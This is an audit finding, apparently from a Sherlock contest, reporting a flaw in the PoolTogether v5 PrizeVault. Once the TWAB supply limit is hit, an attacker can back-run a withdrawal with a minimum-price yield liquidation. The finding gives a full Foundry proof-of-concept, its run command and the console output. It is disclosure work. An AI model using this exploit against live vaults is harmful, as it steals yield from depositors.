Creamy Ginger Salamander

high

# after the TWAB limit is reached, back-running a call to `withdraw` with a liquidation of yield is extremely profitable for the liquidator at the expense of all the other users in the vault

## Summary
after the TWAB limit is reached, back-running a call to `withdraw` with a liquidation of yield is extremely profitable for the liquidator at the expense of all the other users in the vault

## Vulnerability Detail
The price of liquidating yield is inversely proportional to the `elapsedTime` 

```solidity
function _computePrice() internal view returns (uint192) {
        uint256 elapsedTime = block.timestamp - lastAuctionAt;
        if (elapsedTime == 0) {
            return type(uint192).max;
        }
        uint192 price = uint192((targetAuctionPeriod * lastAuctionPrice) / elapsedTime);

        if (price < MIN_PRICE) {
            price = MIN_PRICE;
        }

        return price;
    }
```

Once the `TWAB_SUPPLY_LIMIT` is reached, all liquidation attempts will revert due to the `_enforceMintLimit()` in `transferTokensOut()`

A liquidator can take advantage of this by the following steps

1. `TWAB_SUPPLY_LIMIT` is reached for a vault, at this point any future liquidations will revert, but `elapsedTime` keeps accruing

2. Once price = MIN_PRICE, due to a large `elapsedTime`, the liquidator will withdraw some assets from the vault, this will burn some shares and reduce the totalSupply

3. The liquidator will immediately backrun the `withdraw` call with a liquidation at price = MIN_PRICE for a huge profit at the expense of the other vault users

The result will be the attacker exchanging very few prizeTokens for all the yield.


A key point to note is that if some other user withdraws before the price = MIN_PRICE, the liquidator can backrun that users Tx with a deposit to reach the `TWAB_SUPPLY_LIMIT` and prevent other liquidations.

TWAB_SUPPLY_LIMIT = type(uint96).max 

This is easily achievable for ERC20's with a large totalSupply and low price for example SHIBE or LADYS

The protocol stated in the README
>The protocol supports any standard ERC20 that does not have reentrancy or fee on transfer.

Therefore it should support tokens like SHIBE and LADYS ( they fit the criteria ) but the PrizeVaults do not

## Impact
The attacker has effectively stolen the yield from other users. 

The attacker has reduced the chances of winning for all other users of that vault.

## Proof of concept
Replace the existing `BaseIntegration.t.sol` in /2024-05-pooltogether/pt-v5-vault/test/integration/BaseIntegration.t.sol with the following 
<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { Test } from "forge-std/Test.sol";
import { console2 } from "forge-std/console2.sol";

import { IERC20, IERC4626 } from "openzeppelin/token/ERC20/extensions/ERC4626.sol";

import { PrizePool } from "pt-v5-prize-pool/PrizePool.sol";
import { TwabController } from "pt-v5-twab-controller/TwabController.sol";

import { ERC20PermitMock } from "../contracts/mock/ERC20PermitMock.sol";
import { PrizePoolMock } from "../contracts/mock/PrizePoolMock.sol";
import { Permit } from "../contracts/utility/Permit.sol";

import { PrizeVaultWrapper, PrizeVault } from "../contracts/wrapper/PrizeVaultWrapper.sol";

import { YieldVault } from "../contracts/mock/YieldVault.sol";

abstract contract BaseIntegration is Test, Permit {

    /* ============ events ============ */

    event Deposit(address indexed sender, address indexed owner, uint256 assets, uint256 shares);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event ClaimerSet(address indexed claimer);
    event LiquidationPairSet(address indexed tokenOut, address indexed liquidationPair);
    event YieldFeeRecipientSet(address indexed yieldFeeRecipient);
    event YieldFeePercentageSet(uint256 yieldFeePercentage);
    event MockContribute(address prizeVault, uint256 amount);
    event ClaimYieldFeeShares(address indexed recipient, uint256 shares);
    event TransferYieldOut(address indexed liquidationPair, address indexed tokenOut, address indexed recipient, uint256 amountOut, uint256 yieldFee);
    event Sponsor(address indexed caller, uint256 assets, uint256 shares);

    /* ============ variables ============ */

    address public vitalik = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;
    address public attacker = 0xEf57e88a27f8958D72fd9F983D28349374e6C110;

    address internal owner;
    uint256 internal ownerPrivateKey;

    address internal alice;
    uint256 internal alicePrivateKey;

    address internal bob;
    uint256 internal bobPrivateKey;

    PrizeVaultWrapper public prizeVault;
    string public vaultName = "PoolTogether Test Vault";
    string public vaultSymbol = "pTest";
    uint256 public yieldBuffer = 1e5;

    IERC4626 public yieldVault;
    ERC20PermitMock public underlyingAsset;
    uint8 public assetDecimals;
    uint256 public approxAssetUsdExchangeRate;
    ERC20PermitMock public prizeToken;

    address public claimer;
    PrizePoolMock public prizePool;

    uint32 public drawPeriodSeconds = 1 days;
    TwabController public twabController;

    /// @dev A low gas estimate of what it would cost in gas to manipulate the state into losing 1 wei of assets
    /// in a rounding error. (This should be a unachievable low estimate such that an attacker would never be able
    /// to cause repeated rounding errors for less).
    uint256 lowGasEstimateForStateChange = 100_000;

    /// @dev A low gas price estimate for the chain.
    uint256 lowGasPriceEstimate = 7 gwei;

    /// @dev Defined in 1e18 precision. (2e18 would be 2 ETH per USD)
    uint256 approxEthUsdExchangeRate = uint256(1e18) / uint256(3000); // approx 1 ETH for $3000

    /// @dev Override to true if vault is not expected to have yield
    bool ignoreYield = false;

    /// @dev Override to true if vault cannot feasibly lose assets
    bool ignoreLoss = false;

    /// @dev Some yield vaults have predictable precision loss (such as Sonne which reduces precision of assets with their exchange rate).
    /// This optional variable can be set if this precision loss is acknowledged and appropriate countermeasures will be taken (ex. deploying
    /// a PrizeVault with a higher yield buffer to match the reduced precision).
    uint8 assetPrecisionLoss = 0;

    /* ============ setup ============ */

    function setUpUnderlyingAsset() public virtual returns (IERC20 asset, uint8 decimals, uint256 approxAssetUsdExchangeRate);

    function setUpYieldVault() public virtual returns (IERC4626) {
        return new YieldVault(
            address(underlyingAsset),
            "Test Yield Vault",
            "yvTest"
        );
    }

    function setUpFork() public virtual;

    function beforeSetup() public virtual;

    function afterSetup() public virtual;

    function setUp() public virtual {
        beforeSetup();

        (owner, ownerPrivateKey) = makeAddrAndKey("Owner");
        (alice, alicePrivateKey) = makeAddrAndKey("Alice");
        (bob, bobPrivateKey) = makeAddrAndKey("Bob");

        underlyingAsset = new ERC20PermitMock("SHIBE");

        yieldVault = setUpYieldVault();

        

        prizeToken = new ERC20PermitMock("POOL");

        twabController = new TwabController(1 hours, uint32(block.timestamp));

        prizePool = new PrizePoolMock(prizeToken, twabController);

        claimer = address(0xe291d9169F0316272482dD82bF297BB0a11D267f);

        // adjust yield buffer based-on mitigated precision loss
        yieldBuffer = 1e5 * (10 ** assetPrecisionLoss);

        prizeVault = new PrizeVaultWrapper(
            vaultName,
            vaultSymbol,
            yieldVault,
            PrizePool(address(prizePool)),
            claimer,
            bob,
            9e8,
            yieldBuffer, // yield buffer
            address(this)
        );
        prizeVault.setLiquidationPair(address(this));

        // Fill yield buffer if non-zero:
        if (yieldBuffer > 0) {
            dealAssets(address(prizeVault), yieldBuffer);
        }

        afterSetup();
    }

    /* ============ prank helpers ============ */

    address private currentPrankee;

    /// @notice should be used instead of vm.startPrank so we can keep track of pranks within other pranks
    function startPrank(address prankee) public {
        currentPrankee = prankee;
        vm.startPrank(prankee);
    }

    /// @notice should be used instead of vm.stopPrank so we can keep track of pranks within other pranks
    function stopPrank() public {
        currentPrankee = address(0);
        vm.stopPrank();
    }

    /// @notice pranks the address and sets the prank back to the msg sender at the end
    modifier prankception(address prankee) {
        address prankBefore = currentPrankee;
        vm.stopPrank();
        vm.startPrank(prankee);
        _;
        vm.stopPrank();
        if (prankBefore != address(0)) {
            vm.startPrank(prankBefore);
        }
    }

    /* ============ helpers to override ============ */

    /// @dev The max amount of assets than can be dealt.
    function maxDeal() public virtual returns (uint256);

    /// @dev May revert if the amount requested exceeds the amount available to deal.
    function dealAssets(address to, uint256 amount) public virtual;

    /// @dev Some yield sources accrue by time, so it's difficult to accrue an exact amount. Call the 
    /// function multiple times if the test requires the accrual of more yield than the default amount.
    function _accrueYield() internal virtual;

    /// @dev Simulates loss on the yield vault such that the value of it's shares drops
    function _simulateLoss() internal virtual;

    /// @dev Each integration test must override the `_accrueYield` internal function for this to work.
    function accrueYield() public returns (uint256) {
        uint256 assetsBefore = prizeVault.totalPreciseAssets();
        _accrueYield();
        uint256 assetsAfter = prizeVault.totalPreciseAssets();
        if (yieldVault.balanceOf(address(prizeVault)) > 0) {
            // if the prize vault has any yield vault shares, check to ensure yield has accrued
            require(assetsAfter > assetsBefore, "yield did not accrue");
        } else {
            if (underlyingAsset.balanceOf(address(prizeVault)) > 0) {
                // the underlying asset might be rebasing in some setups, so it's possible time passing has caused an increase in latent balance
                require(assetsAfter >= assetsBefore, "assets decreased while holding latent balance");
            } else {
                // otherwise, we should expect no change on the prize vault
                require(assetsAfter == assetsBefore, "assets changed with zero yield shares");
            }
        }
        return assetsAfter - assetsBefore;
    }

    function checkIgnoreYield() internal returns (bool) {
        if (ignoreYield) {
            console2.log("skipping test since yield is ignored...");
            return true;
        }
        return false;
    }

    /// @dev Each integration test must override the `_simulateLoss` internal function for this to work.
    /// @return The loss the prize vault has incurred as a result of yield vault loss (if any)
    function simulateLoss() public returns (uint256) {
        uint256 assetsBefore = prizeVault.totalPreciseAssets();
        _simulateLoss();
        uint256 assetsAfter = prizeVault.totalPreciseAssets();
        if (yieldVault.balanceOf(address(prizeVault)) > 0) {
            // if the prize vault has any yield vault shares, check to ensure some loss has occurred
            require(assetsAfter < assetsBefore, "loss not simulated");
        } else {
            if (underlyingAsset.balanceOf(address(prizeVault)) > 0) {
                // the underlying asset might be rebasing in some setups, so it's possible time passing has caused an increase in latent balance
                require(assetsAfter >= assetsBefore, "assets decreased while holding latent balance");
                return 0;
            } else {
                // otherwise, we should expect no change on the prize vault
                require(assetsAfter == assetsBefore, "assets changed with zero yield shares");
            }
        }
        return assetsBefore - assetsAfter;
    }

    function checkIgnoreLoss() internal returns (bool) {
        if (ignoreLoss) {
            console2.log("skipping test since loss is ignored...");
            return true;
        }
        return false;
    }

    /* ============ Integration Test Scenarios ============ */

    //////////////////////////////////////////////////////////
    /// Basic Asset Tests
    //////////////////////////////////////////////////////////

    /// @dev Tests if the asset meets a minimum precision per dollar (PPD). If the asset
    /// is below this PPD, then it is possible that the yield buffer will not be able to sustain
    /// the rounding errors that will accrue on deposits and withdrawals.
    ///
    /// Also passes if the yield buffer is zero (no buffer is needed if rounding errors are impossible).
    function testAssetPrecisionMeetsMinimum() public {
        if (yieldBuffer > 0) {
            uint256 minimumPPD = 1e6; // USDC is the benchmark (6 decimals represent $1 of value)
            uint256 assetPPD = (1e18 * (10 ** (assetDecimals - assetPrecisionLoss))) / approxAssetUsdExchangeRate;
            assertGe(assetPPD, minimumPPD, "asset PPD > minimum PPD");
        }
    }

    /// @notice Test if the attacker can cause rounding error loss on the prize vault by spending
    /// less in gas than the rounding error loss will cost the vault.
    ///
    /// @dev This is an important measure to test since it's possible that some yield vaults can essentially
    /// rounding errors to other holders of yield vault shares. If an attacker can cheaply cause repeated
    /// rounding errors on the prize vault, they can potentially profit by being a majority shareholder on
    /// the underlying yield vault.
    function testAssetRoundingErrorManipulationCost() public {
        uint256 costToManipulateInEth = lowGasPriceEstimate * lowGasEstimateForStateChange;
        uint256 costToManipulateInUsd = (costToManipulateInEth * 1e18) / approxEthUsdExchangeRate;
        uint256 costOfRoundingErrorInUsd = ((10 ** assetPrecisionLoss) * 1e18) / approxAssetUsdExchangeRate;
        // 10x threshold is set so an attacker would have to spend at least 10x the loss they can cause on the prize vault.
        uint256 multiplierThreshold = 10;
        assertLt(costOfRoundingErrorInUsd * multiplierThreshold, costToManipulateInUsd, "attacker can cheaply cause rounding errors");
    }

    //////////////////////////////////////////////////////////
    /// Deposit Tests
    //////////////////////////////////////////////////////////

    /// @notice test deposit
    function testDeposit() public {
        uint256 amount = 10 ** assetDecimals;
        uint256 maxAmount = maxDeal() / 2;
        if (amount > maxAmount) amount = maxAmount;
        dealAssets(alice, amount);

        uint256 totalAssetsBefore = prizeVault.totalPreciseAssets();
        uint256 totalSupplyBefore = prizeVault.totalSupply();

        startPrank(alice);
        underlyingAsset.approve(address(prizeVault), amount);
        prizeVault.deposit(amount, alice);
        stopPrank();

        uint256 totalAssetsAfter = prizeVault.totalPreciseAssets();
        uint256 totalSupplyAfter = prizeVault.totalSupply();

        assertEq(prizeVault.balanceOf(alice), amount, "shares minted");
        assertApproxEqAbs(
            totalAssetsBefore + amount,
            totalAssetsAfter,
            10 ** assetPrecisionLoss,
            "assets accounted for with possible rounding error"
        );
        assertEq(totalSupplyBefore + amount, totalSupplyAfter, "supply increased by amount");
    }

    /// @notice test multi-user deposit
    function testMultiDeposit() public {
        address[] memory depositors = new address[](3);
        depositors[0] = alice;
        depositors[1] = bob;
        depositors[2] = address(this);

        for (uint256 i = 0; i < depositors.length; i++) {
            uint256 amount = (10 ** assetDecimals) * (i + 1);
            uint256 maxAmount = maxDeal() / 2;
            if (amount > maxAmount) amount = maxAmount;
            dealAssets(depositors[i], amount);

            uint256 totalAssetsBefore = prizeVault.totalPreciseAssets();
            uint256 totalSupplyBefore = prizeVault.totalSupply();

            startPrank(depositors[i]);
            underlyingAsset.approve(address(prizeVault), amount);
            prizeVault.deposit(amount, depositors[i]);
            stopPrank();

            uint256 totalAssetsAfter = prizeVault.totalPreciseAssets();
            uint256 totalSupplyAfter = prizeVault.totalSupply();

            assertEq(prizeVault.balanceOf(depositors[i]), amount, "shares minted");
            assertApproxEqAbs(
                totalAssetsBefore + amount,
                totalAssetsAfter,
                10 ** assetPrecisionLoss,
                "assets accounted for with possible rounding error"
            );
            assertEq(totalSupplyBefore + amount, totalSupplyAfter, "supply increased by amount");
        }
    }

    /// @notice test multi-user deposit w/yield accrual in between
    function testMultiDepositWithYieldAccrual() public {
        if (checkIgnoreYield()) return;

        address[] memory depositors = new address[](2);
        depositors[0] = alice;
        depositors[1] = bob;

        for (uint256 i = 0; i < depositors.length; i++) {
            uint256 amount = (10 ** assetDecimals) * (i + 1);
            uint256 maxAmount = maxDeal() / 2;
            if (amount > maxAmount) amount = maxAmount;
            dealAssets(depositors[i], amount);

            uint256 totalAssetsBefore = prizeVault.totalPreciseAssets();
            uint256 totalSupplyBefore = prizeVault.totalSupply();

            startPrank(depositors[i]);
            underlyingAsset.approve(address(prizeVault), amount);
            prizeVault.deposit(amount, depositors[i]);
            stopPrank();

            uint256 totalAssetsAfter = prizeVault.totalPreciseAssets();
            uint256 totalSupplyAfter = prizeVault.totalSupply();

            assertEq(prizeVault.balanceOf(depositors[i]), amount, "shares minted");
            assertApproxEqAbs(
                totalAssetsBefore + amount,
                totalAssetsAfter,
                10 ** assetPrecisionLoss,
                "assets accounted for with possible rounding error"
            );
            assertEq(totalSupplyBefore + amount, totalSupplyAfter, "supply increased by amount");

            if (i == 0) {
                // accrue yield
                accrueYield();
            }
        }
    }

    //////////////////////////////////////////////////////////
    /// Withdrawal Tests
    //////////////////////////////////////////////////////////

    /// @notice test withdraw
    /// @dev also tests for any active deposit / withdraw fees
    function testWithdraw() public {
        uint256 amount = 10 ** assetDecimals;
        uint256 maxAmount = maxDeal() / 2;
        if (amount > maxAmount) amount = maxAmount;
        dealAssets(alice, amount);

        uint256 totalAssetsBefore = prizeVault.totalPreciseAssets();
        uint256 totalSupplyBefore = prizeVault.totalSupply();

        startPrank(alice);
        underlyingAsset.approve(address(prizeVault), amount);
        prizeVault.deposit(amount, alice);
        prizeVault.withdraw(amount, alice, alice);
        stopPrank();

        uint256 totalAssetsAfter = prizeVault.totalPreciseAssets();
        uint256 totalSupplyAfter = prizeVault.totalSupply();

        assertEq(prizeVault.balanceOf(alice), 0, "burns all user shares on full withdraw");
        assertEq(underlyingAsset.balanceOf(alice), amount, "withdraws full amount of assets");
        assertApproxEqAbs(
            totalAssetsBefore,
            totalAssetsAfter,
            2 * 10 ** assetPrecisionLoss,
            "no assets missing except for possible rounding error"
        ); // 1 possible rounding error for deposit, 1 for withdraw
        assertEq(totalSupplyBefore, totalSupplyAfter, "supply same as before");
    }

    /// @notice test withdraw with yield accrual
    function testWithdrawWithYieldAccrual() public {
        if (checkIgnoreYield()) return;

        uint256 amount = 10 ** assetDecimals;
        uint256 maxAmount = maxDeal() / 2;
        if (amount > maxAmount) amount = maxAmount;
        dealAssets(alice, amount);

        uint256 totalAssetsBefore = prizeVault.totalPreciseAssets();
        uint256 totalSupplyBefore = prizeVault.totalSupply();

        startPrank(alice);
        underlyingAsset.approve(address(prizeVault), amount);
        prizeVault.deposit(amount, alice);
        uint256 yield = accrueYield(); // accrue yield in between
        prizeVault.withdraw(amount, alice, alice);
        stopPrank();

        uint256 totalAssetsAfter = prizeVault.totalPreciseAssets();
        uint256 totalSupplyAfter = prizeVault.totalSupply();

        assertEq(prizeVault.balanceOf(alice), 0, "burns all user shares on full withdraw");
        assertEq(underlyingAsset.balanceOf(alice), amount, "withdraws full amount of assets");
        assertApproxEqAbs(
            totalAssetsBefore + yield,
            totalAssetsAfter,
            2 * 10 ** assetPrecisionLoss,
            "no assets missing except for possible rounding error"
        ); // 1 possible rounding error for deposit, 1 for withdraw
        assertEq(totalSupplyBefore, totalSupplyAfter, "supply same as before");
    }

    /// @notice test all users withdraw
    function testWithdrawAllUsers() public {
        address[] memory depositors = new address[](3);
        depositors[0] = alice;
        depositors[1] = bob;
        depositors[2] = address(this);

        uint256[] memory amounts = new uint256[](3);

        // deposit
        for (uint256 i = 0; i < depositors.length; i++) {
            uint256 amount = (10 ** assetDecimals) * (i + 1);
            uint256 maxAmount = maxDeal() / 2;
            if (amount > maxAmount) amount = maxAmount;
            amounts[i] = amount;
            dealAssets(depositors[i], amount);

            startPrank(depositors[i]);
            underlyingAsset.approve(address(prizeVault), amount);
            prizeVault.deposit(amount, depositors[i]);
            stopPrank();
        }

        // withdraw
        for (uint256 i = 0; i < depositors.length; i++) {
            uint256 totalAssetsBefore = prizeVault.totalPreciseAssets();
            uint256 totalSupplyBefore = prizeVault.totalSupply();

            startPrank(depositors[i]);
            prizeVault.withdraw(amounts[i], depositors[i], depositors[i]);
            stopPrank();

            uint256 totalAssetsAfter = prizeVault.totalPreciseAssets();
            uint256 totalSupplyAfter = prizeVault.totalSupply();

            assertEq(prizeVault.balanceOf(depositors[i]), 0, "burned all user's shares on withdraw");
            assertEq(underlyingAsset.balanceOf(depositors[i]), amounts[i], "withdrew full asset amount for user");
            assertApproxEqAbs(
                totalAssetsBefore,
                totalAssetsAfter + amounts[i],
                10 ** assetPrecisionLoss,
                "assets accounted for with no more than 1 wei rounding error"
            );
            assertEq(totalSupplyBefore - amounts[i], totalSupplyAfter, "total supply decreased by amount");
        }
    }

    /// @notice test all users withdraw during lossy state
    function testWithdrawAllUsersWhileLossy() public {
        if (checkIgnoreLoss()) return;

        address[] memory depositors = new address[](3);
        depositors[0] = alice;
        depositors[1] = bob;
        depositors[2] = address(this);

        // deposit
        for (uint256 i = 0; i < depositors.length; i++) {
            uint256 amount = (10 ** assetDecimals) * (i + 1);
            uint256 maxAmount = maxDeal() / 2;
            if (amount > maxAmount) amount = maxAmount;
            dealAssets(depositors[i], amount);

            startPrank(depositors[i]);
            underlyingAsset.approve(address(prizeVault), amount);
            prizeVault.deposit(amount, depositors[i]);
            stopPrank();
        }

        // cause loss on the yield vault
        simulateLoss();

        // ensure prize vault is in lossy state
        assertLt(prizeVault.totalPreciseAssets(), prizeVault.totalDebt());

        // verify all users can withdraw a proportional amount of assets
        for (uint256 i = 0; i < depositors.length; i++) {
            uint256 shares = prizeVault.balanceOf(depositors[i]);
            uint256 totalAssetsBefore = prizeVault.totalPreciseAssets();
            uint256 totalSupplyBefore = prizeVault.totalSupply();
            uint256 totalDebtBefore = prizeVault.totalDebt();
            uint256 expectedAssets = (shares * totalAssetsBefore) / totalDebtBefore;

            startPrank(depositors[i]);
            uint256 assets = prizeVault.redeem(shares, depositors[i], depositors[i]);
            stopPrank();

            uint256 totalAssetsAfter = prizeVault.totalPreciseAssets();
            uint256 totalSupplyAfter = prizeVault.totalSupply();

            assertEq(assets, expectedAssets, "assets received proportional to shares / totalDebt");
            assertEq(prizeVault.balanceOf(depositors[i]), 0, "burned all user's shares on withdraw");
            assertEq(underlyingAsset.balanceOf(depositors[i]), assets, "withdrew assets for user");
            assertApproxEqAbs(
                totalAssetsBefore,
                totalAssetsAfter + assets,
                10 ** assetPrecisionLoss,
                "assets accounted for with no more than 1 wei rounding error"
            );
            assertEq(totalSupplyBefore - shares, totalSupplyAfter, "total supply decreased by shares");
        }
    }

    /// @notice test liquidation of assets
    function testAssetLiquidation() public {
        if (checkIgnoreYield()) return;

        // Deposit
        uint256 amount = 1000 * (10 ** assetDecimals);
        uint256 maxAmount = maxDeal() / 2;
        if (amount > maxAmount) amount = maxAmount;
        dealAssets(alice, amount);

        startPrank(alice);
        underlyingAsset.approve(address(prizeVault), amount);
        prizeVault.deposit(amount, alice);
        stopPrank();

        // Yield Accrual
        uint256 approxYield = accrueYield();
        uint256 availableYield = prizeVault.availableYieldBalance();
        assertApproxEqAbs(
            approxYield,
            availableYield,
            10 ** assetPrecisionLoss,
            "approx yield equals available yield balance"
        );
        uint256 availableAssets = prizeVault.liquidatableBalanceOf(address(underlyingAsset));
        assertGt(availableAssets, 0, "assets are available for liquidation");
        
        // Liquidate
        prizeVault.transferTokensOut(address(0), bob, address(underlyingAsset), availableAssets);
        assertEq(underlyingAsset.balanceOf(bob), availableAssets, "liquidator is transferred expected assets");
        assertApproxEqAbs(prizeVault.availableYieldBalance(), availableYield - availableAssets, 10 ** assetPrecisionLoss, "available yield decreased (w / 1 wei rounding error)");
        assertApproxEqAbs(prizeVault.liquidatableBalanceOf(address(underlyingAsset)), 0, 10 ** assetPrecisionLoss, "no more assets can be liquidated (w/ 1 wei rounding error)");
    }

    /// @notice test liquidatable balance of when lossy
    function testNoLiquidationWhenLossy() public {
        if (checkIgnoreYield() || checkIgnoreLoss()) return;

        // Deposit
        uint256 amount = 1000 * (10 ** assetDecimals);
        uint256 maxAmount = maxDeal() / 2;
        if (amount > maxAmount) amount = maxAmount;
        dealAssets(alice, amount);

        startPrank(alice);
        underlyingAsset.approve(address(prizeVault), amount);
        prizeVault.deposit(amount, alice);
        stopPrank();

        // Yield Accrual
        uint256 approxYield = accrueYield();
        uint256 availableYield = prizeVault.availableYieldBalance();
        assertApproxEqAbs(
            approxYield,
            availableYield,
            10 ** assetPrecisionLoss,
            "approx yield equals available yield balance"
        );
        uint256 availableAssets = prizeVault.liquidatableBalanceOf(address(underlyingAsset));
        assertGt(availableAssets, 0, "assets are available for liquidation");
        uint256 availableShares = prizeVault.liquidatableBalanceOf(address(prizeVault));
        assertGt(availableShares, 0, "shares are available for liquidation");

        // Loss Occurs
        simulateLoss();

        // No liquidations can occur if assets < debt
        availableYield = prizeVault.availableYieldBalance();
        assertEq(availableYield, 0, "no available yield after loss");
        availableAssets = prizeVault.liquidatableBalanceOf(address(underlyingAsset));
        assertEq(availableAssets, 0, "no available asset liquidation after loss");
        availableShares = prizeVault.liquidatableBalanceOf(address(prizeVault));
        assertEq(availableShares, 0, "no available share liquidation after loss");
    }
    
}

```
</details>

Now add the following `BackrunWithdrawWithHugelyProfitableLiquidationPOC.sol` to /2024-05-pooltogether/pt-v5-vault/test/integration/BackrunWithdrawWithHugelyProfitableLiquidationPOC.sol

The following foundry test test__BackrunWithdrawWithHugelyProfitableLiquidationPOC() illustrates the attack scenario.

Run it with the following command line input

```terminal
forge test --mt test__BackrunWithdrawWithHugelyProfitableLiquidationPOC -vv
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { Test } from "forge-std/Test.sol";
import { console } from "forge-std/console.sol";
import { BaseIntegration } from "./BaseIntegration.t.sol";



import { IERC20, IERC4626 } from "openzeppelin/token/ERC20/extensions/ERC4626.sol";

import { PrizePool } from "pt-v5-prize-pool/PrizePool.sol";
import { TwabController } from "pt-v5-twab-controller/TwabController.sol";

import { ERC20PermitMock } from "../contracts/mock/ERC20PermitMock.sol";
import { PrizePoolMock } from "../contracts/mock/PrizePoolMock.sol";
import { Permit } from "../contracts/utility/Permit.sol";

import { PrizeVaultWrapper, PrizeVault } from "../contracts/wrapper/PrizeVaultWrapper.sol";

import { YieldVault } from "../contracts/mock/YieldVault.sol";

contract BackrunWithdrawWithHugelyProfitableLiquidationPOC is Test, BaseIntegration {
    function setUp() override public {
        super.setUp();


        // Setup users
        underlyingAsset.mint(alice, type(uint128).max);
        vm.startPrank(alice);
        underlyingAsset.approve(address(prizeVault), type(uint128).max);

        underlyingAsset.mint(bob, type(uint128).max);
        vm.startPrank(bob);
        underlyingAsset.approve(address(prizeVault), type(uint128).max);

        underlyingAsset.mint(attacker, type(uint128).max);
        vm.startPrank(attacker);
        underlyingAsset.approve(address(prizeVault), type(uint128).max);
    }

    function setUpUnderlyingAsset() public override returns (IERC20 asset, uint8 decimals, uint256 approxAssetUsdExchangeRate) {}

    function setUpFork() public override {}

    function beforeSetup() public override {}

    function afterSetup() public override {}

    /* ============ helpers to override ============ */

    /// @dev The max amount of assets than can be dealt.
    function maxDeal() public override returns (uint256) {}

    /// @dev May revert if the amount requested exceeds the amount available to deal.
    function dealAssets(address to, uint256 amount) public override {}

    /// @dev Some yield sources accrue by time, so it's difficult to accrue an exact amount. Call the 
    /// function multiple times if the test requires the accrual of more yield than the default amount.
    function _accrueYield() internal override {
        vm.startPrank(alice);
        IERC20(underlyingAsset).transfer(address(yieldVault), 10000000);
    }

    /// @dev Simulates loss on the yield vault such that the value of it's shares drops
    function _simulateLoss() internal override {}






    function test__BackrunWithdrawWithHugelyProfitableLiquidationPOC() public {
        // This is to represent thousands of users depositing over time
        vm.startPrank(alice);
        prizeVault.deposit(79228162514264337593443950335, alice);

        // This represents the liquidator depositing in the vault at some point
        vm.startPrank(attacker);
        prizeVault.deposit(100000000, attacker);

        // Yield accrual
        _accrueYield();

        vm.stopPrank();

        // Honest liquidator sees the yield accrue and sends a Tx to liquidate it, but it will revert
        uint256 availableAssets = prizeVault.liquidatableBalanceOf(address(underlyingAsset));
        console.log("availableAssets to liquidate =", availableAssets);

        vm.expectRevert();
        prizeVault.transferTokensOut(address(0), bob, address(underlyingAsset), availableAssets);

        // Attacker waits a few days so that elapsed time accumulates
        skip(3 days);

        // Attacker withdraws their deposit
        vm.startPrank(attacker);
        prizeVault.withdraw(prizeVault.balanceOf(attacker), attacker, attacker);

        vm.stopPrank();

        // Attacker backruns the withdraw with a liquidation at a much lower price since so much time passed
        prizeVault.transferTokensOut(address(0), bob, address(underlyingAsset), availableAssets);
    }
}
```

Console Output

```terminal
Ran 1 test for test/integration/BackrunWithdrawWithHugelyProfitableLiquidationPOC.sol:BackrunWithdrawWithHugelyProfitableLiquidationPOC
[PASS] test__BackrunWithdrawWithHugelyProfitableLiquidationPOC() (gas: 597935)
Logs:
  availableAssets to liquidate = 989999

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.15ms (798.19µs CPU time)

Ran 1 test suite in 13.31ms (2.15ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
## Code Snippet
https://github.com/sherlock-audit/2024-05-pooltogether/blob/1aa1b8c028b659585e4c7a6b9b652fb075f86db3/pt-v5-vault/src/PrizeVault.sol#L744-L750

## Tool used

Manual Review

## Recommendation
This will require a complex solution to prevent introducing other vulnerabilities, possibly redesigning the mint limit